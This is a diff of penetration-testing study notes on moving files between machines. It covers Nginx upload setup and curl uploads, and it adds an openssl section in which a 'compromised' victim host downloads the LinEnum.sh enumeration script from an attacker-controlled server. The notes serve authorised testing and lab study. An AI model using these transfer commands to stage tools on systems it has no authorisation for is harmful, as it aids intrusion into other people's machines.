@@ -63,6 +63,8 @@ In Apache, the PHP module loves to execute anything ending in PHP. Also, by defa
 
 In Apache, the PHP module loves to execute anything ending in PHP. This is not very safe when allowing `HTTP` uploads, as we are trying to avoid that users cannot upload web shells and execute them.
 
+Nginx server: 
+
 ```bash
 # Create a Directory to Handle Uploaded Files
 sudo mkdir -p /var/www/uploads/SecretUploadDirectory
@@ -101,7 +103,7 @@ tail -2 `/var/log/nginx/error.log`
 # and we might check that port 80 could not be binded because is already in use
 
 # See which service is using port 80
-ss -lnpt | grep `80`
+ss -lnpt | grep 80
 # we will obtain the service and also the pid. For instance `2811`
 
 # Check pid, for instance pid 2811, and see who is running it
@@ -111,7 +113,7 @@ ps -ef | grep "2811"
 sudo rm /etc/nginx/sites-enabled/default
 ```
 
-Finally you can copy to your nging server all files you want to transfer with curl:
+Finally you can copy to your nginx server all files you want to transfer with curl:
 
 ```bash
 curl -T file.txt
@@ -166,4 +168,25 @@ Basic usage:
 
 ```bash
 python3 -m uploadserver
+```
+
+
+## openssl
+
+Create a certificate in the attacker's machine:
+
+```shell-session
+openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
+```
+
+Launch the openssl server in the attacker's machine:
+
+```shell-session
+openssl s_server -quiet -accept $portAttacker -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
+```
+
+Next, with the server running, we need to download the file from the compromised machine. So, download the file from the victim's machine:
+
+```shell-session
+openssl s_client -connect $ipAttacker:$portAttacker -quiet > LinEnum.sh
 ```
